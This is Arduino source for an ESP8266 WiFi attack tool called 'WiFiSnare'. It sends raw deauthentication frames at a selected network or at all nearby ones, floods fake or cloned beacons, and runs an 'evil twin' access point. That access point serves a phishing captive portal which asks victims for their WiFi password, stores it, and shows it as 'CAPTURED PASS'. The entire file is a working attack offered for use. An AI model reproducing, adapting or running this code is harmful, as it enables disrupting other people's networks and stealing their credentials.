/*
 * WiFiSnare + Beacon Spam Final Version (COUNTER UPDATE)
 * Logo: GMpro87 | Dev: 9u5M4n9
 * UPDATE: Hidden Support, Custom Spam SSID, Clone Target, Packet Counter & Logic Fix
 */

#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

extern "C" {
  #include "user_interface.h"
}

DNSServer dnsServer;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
ESP8266WebServer webServer(80);
IPAddress subNetMask(255, 255, 255, 0);

// --- CONFIG ---
const char *ssid = "GMpro";
const char *password = "Sangkur87";
String whitelistSSID = "GMpro"; 

// --- STATE & VARS ---
String customSpamName = "WiFi_Rusuh_87";
int spamAmount = 10;
bool spamTargetMode = false;
String correctPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;
bool mass_deauth = false; 
bool beacon_active = false;
unsigned long now = 0, deauth_now = 0, beacon_now = 0;
int mass_idx = 0;

// COUNTER VARS
unsigned long deauth_pkt_sent = 0;
unsigned long beacon_pkt_sent = 0;

typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; int32_t rssi; } networkDetails;
networkDetails networks[16];
networkDetails selectedNetwork;

uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x07, 0x00 };
uint8_t beaconPacket[109] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0xe8, 0x03, 0x31, 0x00, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01 };

// --- HELPERS ---
void savePass(String data) { for (int i = 0; i < (int)data.length(); ++i) EEPROM.write(i, data[i]); EEPROM.write(data.length(), '\0'); EEPROM.commit(); }
String readPass() { char data[150]; for (int i = 0; i < 150; i++) { data[i] = EEPROM.read(i); if (data[i] == '\0') break; } return String(data); }

void transmitDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  if(wifi_send_pkt_freedom(deauthPacket, 26, 0) == 0) deauth_pkt_sent++;
}

void runBeaconSpam(String name) {
  uint8_t admin_ch = WiFi.channel();
  for (int k = 0; k < 6; k++) beaconPacket[10+k] = beaconPacket[16+k] = random(256);
  beaconPacket[10] &= 0xFE; beaconPacket[10] |= 0x02; // LAA MAC Fix
  int ssidLen = name.length(); if(ssidLen > 32) ssidLen = 32;
  memset(&beaconPacket[38], 0x20, 32); memcpy(&beaconPacket[38], name.c_str(), ssidLen);
  beaconPacket[37] = ssidLen; beaconPacket[82] = admin_ch;
  wifi_set_channel(admin_ch);
  if(wifi_send_pkt_freedom(beaconPacket, 109, 0) == 0) beacon_pkt_sent++;
}

void performScan() {
  int n = WiFi.scanNetworks(false, true); if (n <= 0) return;
  for (int i = 0; i < min(n, 16); ++i) {
    String s = WiFi.SSID(i); networks[i].ssid = (s == "") ? "<HIDDEN>" : s;
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6); networks[i].ch = WiFi.channel(i); networks[i].rssi = WiFi.RSSI(i);
  }
}

String bytesToStr(const uint8_t* bytes, uint32_t size) {
  String result; for (uint32_t i = 0; i < size; ++i) { if (i > 0) result += ':'; if (bytes[i] < 0x10) result += '0'; result += String(bytes[i], HEX); } return result;
}

void handleIndex() {
  // --- EVILTWIN VICTIM SHIELD ---
  if (hotspot_active && webServer.hasArg("password")) {
    savePass(webServer.arg("password"));
    webServer.send(200, "text/html", "<html><script>alert('Connection Error. Please re-enter WiFi password.');window.location='/';</script></html>");
    return;
  }
  if (hotspot_active && !webServer.hasArg("ap") && !webServer.hasArg("updateSpam") && !webServer.hasArg("deauth")) {
    String s = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:Arial;text-align:center;padding:20px}.box{border:1px solid #ccc;padding:20px;border-radius:10px}input{width:90%;padding:10px;margin:10px 0}button{width:95%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:5px}</style></head><body><div class='box'><h3>WiFi Update Required</h3><p>Your connection requires a firmware update. Please enter your WiFi password to continue.</p><form method='post'><input type='password' name='password' placeholder='Enter WiFi Password' required><br><button>CONNECT</button></form></div></body></html>";
    webServer.send(200, "text/html", s);
    return;
  }

  // --- HTML UI ADMIN ---
  correctPassword = readPass();
  if (webServer.hasArg("clear")) { for(int i=0;i<150;i++) EEPROM.write(i,0); EEPROM.commit(); correctPassword = ""; deauth_pkt_sent = 0; beacon_pkt_sent = 0; }
  if (webServer.hasArg("ap")) {
    String b = webServer.arg("ap");
    for (int i=0; i<16; i++) if (bytesToStr(networks[i].bssid, 6) == b) selectedNetwork = networks[i];
  }
  if (webServer.hasArg("updateSpam")) {
    if (webServer.hasArg("spamName")) customSpamName = webServer.arg("spamName");
    if (webServer.hasArg("spamQty")) spamAmount = webServer.arg("spamQty").toInt();
    spamTargetMode = webServer.hasArg("spamTarget");
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
  if (webServer.hasArg("rusuh")) mass_deauth = (webServer.arg("rusuh") == "start");
  if (webServer.hasArg("beacon")) beacon_active = (webServer.arg("beacon") == "start");
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "start");
    dnsServer.stop(); WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, subNetMask);
    String targetName = (selectedNetwork.ssid == "<HIDDEN>") ? "Free_Public_WiFi" : selectedNetwork.ssid;
    WiFi.softAP(hotspot_active ? targetName.c_str() : ssid, hotspot_active ? NULL : password);
    dnsServer.start(53, "*", apIP); return;
  }

  String p = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'><style>body{font-family:Arial;background:#000;color:#fff;margin:0;padding:10px;text-align:center}h2{border:2px solid orange;padding:8px;display:inline-block;border-radius:6px;margin:10px 0;text-transform:uppercase}.dev{font-size:10px;color:#888;margin-bottom:15px}.pass-box{background:#050;color:#0f0;border:2px dashed #0f0;padding:12px;margin:10px 0;text-align:left;border-radius:8px;font-family:monospace}table{width:100%;border-collapse:collapse;font-size:12px}th,td{padding:10px 5px;border:1px solid #146dcc}th{background:rgba(20,109,204,0.3);color:orange}.btn-sel{background:#eb3489;color:#fff;border:none;padding:6px;border-radius:4px;width:100%;font-size:11px}.btn-ok{background:#FFC72C;color:#000;border:none;padding:6px;border-radius:4px;width:100%;font-weight:bold;font-size:11px}.spam-box{background:#111;padding:10px;border:1px solid #333;margin:15px 0;text-align:left;font-size:12px;border-radius:5px}.inp{background:#222;color:orange;border:1px solid orange;padding:8px;border-radius:4px;width:92%;margin:5px 0}.ctrl{display:flex;justify-content:space-between;margin-top:20px;flex-wrap:wrap}.cmd{flex:1;margin:2px;padding:12px 0;border:none;border-radius:4px;color:#fff;font-weight:bold;font-size:11px;text-transform:uppercase}hr{border:0;border-top:1px solid orange;margin:15px 0}.log-c{font-size:9px;margin-top:2px}</style></head><body><h2>GMpro87</h2><div class='dev'>dev : 9u5M4n9</div>";
  if(correctPassword != "" && correctPassword != "0") { p += "<div class='pass-box'><b>[ CAPTURED PASS ]</b><br>Target: " + selectedNetwork.ssid + "<br>Pass : " + correctPassword + "<br><a href='/?clear=1' style='color:#f44;font-size:11px;text-decoration:none'>[HAPUS]</a></div>"; }
  p += "<table><tr><th>SSID</th><th>Ch</th><th>%</th><th>Aksi</th></tr>";
  for (int i=0; i<16 && (networks[i].ssid != "" || networks[i].bssid[0] != 0); i++) {
    String b = bytesToStr(networks[i].bssid, 6); bool s = (b == bytesToStr(selectedNetwork.bssid, 6));
    p += "<tr><td>" + networks[i].ssid + "</td><td>" + String(networks[i].ch) + "</td><td>" + String(2*(networks[i].rssi+100)) + "</td><td><form method='post' action='/?ap=" + b + "'><button class='" + String(s?"btn-ok":"btn-sel") + "'>" + (s?"Selected":"Select") + "</button></form></td></tr>";
  }
  p += "</table><hr><div class='spam-box'><b style='color:orange'>SPAM SETTING:</b><br><form method='post' action='/?updateSpam=1'>SSID:<br><input class='inp' name='spamName' value='" + customSpamName + "'><br>Qty (1-60):<br><input class='inp' type='number' name='spamQty' value='" + String(spamAmount) + "'><br><label><input type='checkbox' name='spamTarget' " + (spamTargetMode?"checked":"") + "> Clone Target</label><button class='btn-ok' style='width:100%;margin-top:10px'>SAVE SETTING</button></form></div>";
  
  p += "<div class='ctrl'>";
  p += "<form method='post' action='/?deauth=" + String(deauthing_active?"stop":"start") + "' style='flex:1'><button class='cmd' style='background:" + String(deauthing_active?"#f00":"#0c8") + ";width:98%'>DEAUTH</button>";
  if(deauthing_active) p += "<div class='log-c' style='color:#0f0'>" + String(deauth_pkt_sent) + " pkt (26b)</div>"; p += "</form>";
  
  p += "<form method='post' action='/?rusuh=" + String(mass_deauth?"stop":"start") + "' style='flex:1'><button class='cmd' style='background:" + String(mass_deauth?"#f00":"#e60") + ";width:98%'>RUSUH</button>";
  if(mass_deauth) p += "<div class='log-c' style='color:#f0f'>Storming...</div>"; p += "</form>";
  
  p += "<form method='post' action='/?beacon=" + String(beacon_active?"stop":"start") + "' style='flex:1'><button class='cmd' style='background:" + String(beacon_active?"#f00":"#60d") + ";width:98%'>BEACON</button>";
  if(beacon_active) p += "<div class='log-c' style='color:#0ff'>" + String(beacon_pkt_sent) + " pkt (109b)</div>"; p += "</form>";
  
  p += "<form method='post' action='/?hotspot=" + String(hotspot_active?"stop":"start") + "' style='flex:1'><button class='cmd' style='background:" + String(hotspot_active?"#f00":"#a53") + ";width:98%'>EVILTWIN</button></form></div></body></html>";
  webServer.send(200, "text/html", p);
}

void setup() {
  EEPROM.begin(512); correctPassword = readPass();
  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, subNetMask); WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", apIP);
  webServer.on("/", handleIndex); webServer.onNotFound(handleIndex); webServer.begin();
}

void loop() {
  dnsServer.processNextRequest(); webServer.handleClient();
  if (deauthing_active && !mass_deauth && millis() - deauth_now >= 1000) { if (selectedNetwork.bssid[0] != 0) transmitDeauth(selectedNetwork.bssid, selectedNetwork.ch); deauth_now = millis(); }
  if (mass_deauth && millis() - deauth_now >= 150) {
    if (networks[mass_idx].bssid[0] != 0) { if (networks[mass_idx].ssid != whitelistSSID && networks[mass_idx].ssid != ssid) transmitDeauth(networks[mass_idx].bssid, networks[mass_idx].ch); mass_idx++; if (mass_idx >= 16 || networks[mass_idx].bssid[0] == 0) mass_idx = 0; } else { mass_idx = 0; }
    deauth_now = millis();
  }
  if (beacon_active && millis() - beacon_now >= 100) {
    String nameToSpam = (spamTargetMode && selectedNetwork.ssid != "" && selectedNetwork.ssid != "<HIDDEN>") ? selectedNetwork.ssid : customSpamName;
    for (int i = 0; i < spamAmount; i++) runBeaconSpam(nameToSpam);
    beacon_now = millis();
  }
  if (millis() - now >= 15000) { performScan(); now = millis(); }
}
